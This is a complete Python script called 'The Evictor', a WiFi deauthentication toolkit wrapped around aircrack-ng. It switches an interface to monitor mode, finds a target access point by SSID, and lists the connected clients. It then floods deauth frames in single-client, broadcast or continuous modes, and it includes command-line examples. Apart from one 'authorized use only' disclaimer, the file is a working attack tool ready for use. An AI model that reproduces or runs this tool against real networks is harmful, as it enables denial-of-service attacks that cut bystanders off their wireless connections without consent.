#!/usr/bin/env python3
"""
The Evictor - WiFi Deauthentication Toolkit
For authorized penetration testing only.
"""

import subprocess
import argparse
import sys
import os
import re
import time
import signal
import logging
from datetime import datetime
from typing import Optional

# Colour helpers (no external deps)
R  = "\033[91m";  G  = "\033[92m";  Y  = "\033[93m"
B  = "\033[94m";  M  = "\033[95m";  C  = "\033[96m"
W  = "\033[97m";  DIM = "\033[2m";  RST = "\033[0m"; BOLD = "\033[1m"

BANNER = f"""
{M}{BOLD}
  ███████╗██╗   ██╗██╗ ██████╗████████╗ ██████╗ ██████╗
  ██╔════╝██║   ██║██║██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
  █████╗  ██║   ██║██║██║        ██║   ██║   ██║██████╔╝
  ██╔══╝  ╚██╗ ██╔╝██║██║        ██║   ██║   ██║██╔══██╗
  ███████╗ ╚████╔╝ ██║╚██████╗   ██║   ╚██████╔╝██║  ██║
  ╚══════╝  ╚═══╝  ╚═╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
{RST}{DIM}  WiFi Deauthentication Toolkit - For Authorized Use Only{RST}
"""

logging.basicConfig(
    filename="evictor.log",
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)

def log(msg, level="info"):
    print(msg)
    getattr(logging, level)(re.sub(r'\033\[[0-9;]*m', '', msg))

def info(msg):  log(f"{C}[*]{RST} {msg}")
def ok(msg):    log(f"{G}[+]{RST} {msg}")
def warn(msg):  log(f"{Y}[!]{RST} {msg}", "warning")
def err(msg):   log(f"{R}[-]{RST} {msg}", "error")
def hdr(msg):   print(f"\n{M}{BOLD}{'='*54}{RST}\n{BOLD}  {msg}{RST}\n{M}{'='*54}{RST}")


REQUIRED_TOOLS = ["airmon-ng", "airodump-ng", "aireplay-ng", "iwconfig"]

def check_root():
    if os.geteuid() != 0:
        err("Must run as root.  Try: sudo python3 evictor.py ...")
        sys.exit(1)

def check_tools():
    missing = [t for t in REQUIRED_TOOLS if subprocess.call(
        ["which", t], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0]
    if missing:
        err(f"Missing tools: {', '.join(missing)}")
        err("Install with: sudo apt install aircrack-ng")
        sys.exit(1)
    ok("All aircrack-ng tools found.")


class MonitorMode:
    """Context manager that enables/disables monitor mode automatically."""

    def __init__(self, iface):
        self.iface = iface
        self.mon_iface = None

    def __enter__(self):
        hdr("Setting Up Monitor Mode")
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
        info(f"Enabling monitor mode on {BOLD}{self.iface}{RST} ...")
        result = subprocess.run(
            ["airmon-ng", "start", self.iface],
            capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            m = re.search(r'((?:wlan|mon)\w*mon\d*)', line)
            if m:
                self.mon_iface = m.group(1)
                break
        if not self.mon_iface:
            iw = subprocess.run(["iwconfig"], capture_output=True, text=True)
            for line in iw.stdout.splitlines():
                if "Mode:Monitor" in line:
                    self.mon_iface = line.split()[0]
                    break
        if not self.mon_iface:
            self.mon_iface = self.iface + "mon"
        ok(f"Monitor interface: {BOLD}{self.mon_iface}{RST}")
        return self.mon_iface

    def __exit__(self, *_):
        hdr("Restoring Managed Mode")
        subprocess.run(["airmon-ng", "stop", self.mon_iface], capture_output=True)
        subprocess.run(["service", "NetworkManager", "start"], capture_output=True)
        ok(f"Interface {self.mon_iface} restored.")


def resolve_bssid(mon_iface, ssid, scan_secs=15):
    """
    Dynamic BSSID Resolver:
    Scans the air for `scan_secs` seconds and returns (BSSID, channel)
    for the AP whose ESSID matches `ssid` (case-insensitive).
    Handles dynamic BSSID changes across different locations automatically.
    """
    hdr(f"Dynamic BSSID Resolution - Scanning for '{ssid}'")
    tmp = f"/tmp/evictor_scan_{int(time.time())}"
    info(f"Passive scan for {scan_secs}s ...")

    proc = subprocess.Popen(
        ["airodump-ng", "--write", tmp, "--output-format", "csv", mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    for remaining in range(scan_secs, 0, -1):
        print(f"\r  {Y}Scanning... {remaining}s remaining{RST}   ", end="", flush=True)
        time.sleep(1)
    print()
    proc.terminate()
    proc.wait()

    csv_path = tmp + "-01.csv"
    if not os.path.exists(csv_path):
        err("Scan produced no output. Check interface.")
        sys.exit(1)

    with open(csv_path, "r", errors="replace") as f:
        content = f.read()

    bssid, channel = _parse_airodump_csv(content, ssid)
    if not bssid:
        err(f"SSID '{ssid}' not found in scan. Try increasing --scan-time.")
        sys.exit(1)

    ok(f"Resolved  SSID={BOLD}{ssid}{RST}  BSSID={BOLD}{bssid}{RST}  Channel={BOLD}{channel}{RST}")
    for ext in ["-01.csv", "-01.kismet.csv", "-01.kismet.netxml"]:
        try:
            os.remove(tmp + ext)
        except FileNotFoundError:
            pass

    return bssid, channel


def _parse_airodump_csv(content, ssid):
    in_ap_section = True
    for line in content.splitlines():
        line = line.strip()
        if line.startswith("Station MAC"):
            in_ap_section = False
            continue
        if not in_ap_section or not line:
            continue
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue
        row_bssid   = parts[0]
        row_channel = parts[3].strip()
        row_essid   = parts[13].strip()
        if (row_essid.lower() == ssid.lower()
                and re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', row_bssid)):
            return row_bssid, row_channel
    return "", ""


def get_connected_clients(mon_iface, bssid, channel, scan_secs=10):
    hdr(f"Enumerating Clients on {bssid}")
    tmp = f"/tmp/evictor_clients_{int(time.time())}"
    proc = subprocess.Popen(
        ["airodump-ng", "--bssid", bssid, "-c", channel,
         "--write", tmp, "--output-format", "csv", mon_iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    for remaining in range(scan_secs, 0, -1):
        print(f"\r  {Y}Capturing clients... {remaining}s remaining{RST}   ", end="", flush=True)
        time.sleep(1)
    print()
    proc.terminate()
    proc.wait()

    csv_path = tmp + "-01.csv"
    clients = []
    if os.path.exists(csv_path):
        with open(csv_path, "r", errors="replace") as f:
            content = f.read()
        in_station = False
        for line in content.splitlines():
            line = line.strip()
            if line.startswith("Station MAC"):
                in_station = True
                continue
            if not in_station or not line:
                continue
            parts = [p.strip() for p in line.split(",")]
            if len(parts) >= 6:
                client_mac  = parts[0]
                assoc_bssid = parts[5]
                if (assoc_bssid.upper() == bssid.upper()
                        and re.match(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', client_mac)):
                    clients.append(client_mac)
        try:
            os.remove(csv_path)
        except FileNotFoundError:
            pass

    if clients:
        ok(f"Found {BOLD}{len(clients)}{RST} client(s):")
        for i, c in enumerate(clients, 1):
            print(f"  {DIM}{i:>2}.{RST} {W}{c}{RST}")
    else:
        warn("No associated clients found.")
    return clients


def deauth(mon_iface, bssid, channel, target_mac="FF:FF:FF:FF:FF:FF",
           count=0, continuous=False):
    mode_label = (f"{R}BROADCAST{RST}" if target_mac == "FF:FF:FF:FF:FF:FF"
                  else f"{Y}SURGICAL{RST}  -> {BOLD}{target_mac}{RST}")
    hdr(f"Deauth - {mode_label}")

    subprocess.run(["iwconfig", mon_iface, "channel", channel], capture_output=True)
    info(f"Locked to channel {channel}")

    pkt_arg = "0" if (count == 0 or continuous) else str(count)
    cmd = ["aireplay-ng", "--deauth", pkt_arg, "-a", bssid, "-c", target_mac, mon_iface]
    info(f"Launching: {DIM}{' '.join(cmd)}{RST}")

    try:
        if continuous:
            warn("Continuous mode - press Ctrl+C to stop.")
            subprocess.run(cmd)
        else:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                ok(f"Deauth burst ({count} frames) sent successfully.")
            else:
                err(f"aireplay-ng error:\n{result.stderr.strip()}")
    except KeyboardInterrupt:
        warn("Interrupted by user.")
    except subprocess.TimeoutExpired:
        warn("aireplay-ng timed out - frames likely sent.")


def cmd_kick(args):
    """Surgical single-client kick."""
    check_root(); check_tools()
    with MonitorMode(args.iface) as mon:
        bssid, channel = _get_bssid_and_channel(args, mon)
        deauth(mon, bssid, channel, target_mac=args.mac.upper(),
               count=args.count, continuous=args.continuous)


def cmd_broadcast(args):
    """Kick ALL clients on the target AP simultaneously."""
    check_root(); check_tools()
    with MonitorMode(args.iface) as mon:
        bssid, channel = _get_bssid_and_channel(args, mon)
        if not args.enum_clients:
            warn("Sending broadcast deauth - targets all stations at once.")
            deauth(mon, bssid, channel, target_mac="FF:FF:FF:FF:FF:FF",
                   count=args.count, continuous=args.continuous)
        else:
            clients = get_connected_clients(mon, bssid, channel, args.scan_time)
            if not clients:
                warn("No clients to kick.")
                return
            warn(f"Kicking {len(clients)} client(s) individually ...")
            for mac in clients:
                info(f"  Kicking {mac}")
                deauth(mon, bssid, channel, target_mac=mac, count=args.count)
                time.sleep(0.5)
            ok("All clients processed.")


def cmd_scan(args):
    """Passive scan - list nearby APs and their clients."""
    check_root(); check_tools()
    with MonitorMode(args.iface) as mon:
        if args.ssid:
            bssid, channel = resolve_bssid(mon, args.ssid, args.scan_time)
            get_connected_clients(mon, bssid, channel, args.scan_time)
        else:
            hdr("Passive AP Scan")
            info("Running airodump-ng - press Ctrl+C to stop.")
            try:
                subprocess.run(["airodump-ng", mon])
            except KeyboardInterrupt:
                pass


def _get_bssid_and_channel(args, mon_iface):
    if args.bssid and args.channel:
        ok(f"Using provided BSSID={args.bssid}  Channel={args.channel}")
        return args.bssid.upper(), args.channel
    if args.ssid:
        return resolve_bssid(mon_iface, args.ssid, args.scan_time)
    err("Provide --bssid + --channel  OR  --ssid for dynamic resolution.")
    sys.exit(1)


def build_parser():
    p = argparse.ArgumentParser(
        prog="evictor",
        description="The Evictor - WiFi Deauth Toolkit (aircrack-ng wrapper)",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("-i", "--iface",    default="wlan0", metavar="IFACE",
                   help="Wireless interface (default: wlan0)")
    p.add_argument("--bssid",          metavar="MAC",
                   help="Target AP BSSID (optional if --ssid given)")
    p.add_argument("--channel", "-c",  metavar="CH",
                   help="AP channel (optional if --ssid given)")
    p.add_argument("--ssid",           metavar="NAME",
                   help="Target SSID - triggers dynamic BSSID resolution")
    p.add_argument("--scan-time",      type=int, default=15, metavar="SEC",
                   help="Seconds to scan when resolving SSID (default: 15)")
    p.add_argument("--count", "-n",    type=int, default=64, metavar="N",
                   help="Deauth frames to send per burst (default: 64; 0=continuous)")
    p.add_argument("--continuous",     action="store_true",
                   help="Keep sending until Ctrl+C (overrides --count)")

    sub = p.add_subparsers(title="Modes", dest="mode", required=True)

    # kick
    k = sub.add_parser("kick",
        help="Surgical kick - evict a single client\n"
             "  Example: sudo python3 evictor.py kick AA:BB:CC:DD:EE:FF --ssid MyNet")
    k.add_argument("mac", metavar="CLIENT_MAC",
                   help="Target client MAC address")
    k.set_defaults(func=cmd_kick)

    # broadcast
    b = sub.add_parser("broadcast",
        help="Broadcast - evict ALL clients simultaneously\n"
             "  Example: sudo python3 evictor.py broadcast --ssid MyNet --continuous")
    b.add_argument("--enum-clients", action="store_true",
                   help="Enumerate clients first, then kick each individually")
    b.set_defaults(func=cmd_broadcast)

    # scan
    s = sub.add_parser("scan",
        help="Passive scan - list APs and clients\n"
             "  Example: sudo python3 evictor.py scan --ssid MyNet")
    s.set_defaults(func=cmd_scan)

    return p


def main():
    print(BANNER)
    parser = build_parser()
    args = parser.parse_args()
    signal.signal(signal.SIGINT, lambda *_: (warn("\nAborted by user."), sys.exit(0)))
    args.func(args)
    print(f"\n{DIM}Session logged to evictor.log{RST}\n")


if __name__ == "__main__":
    main()
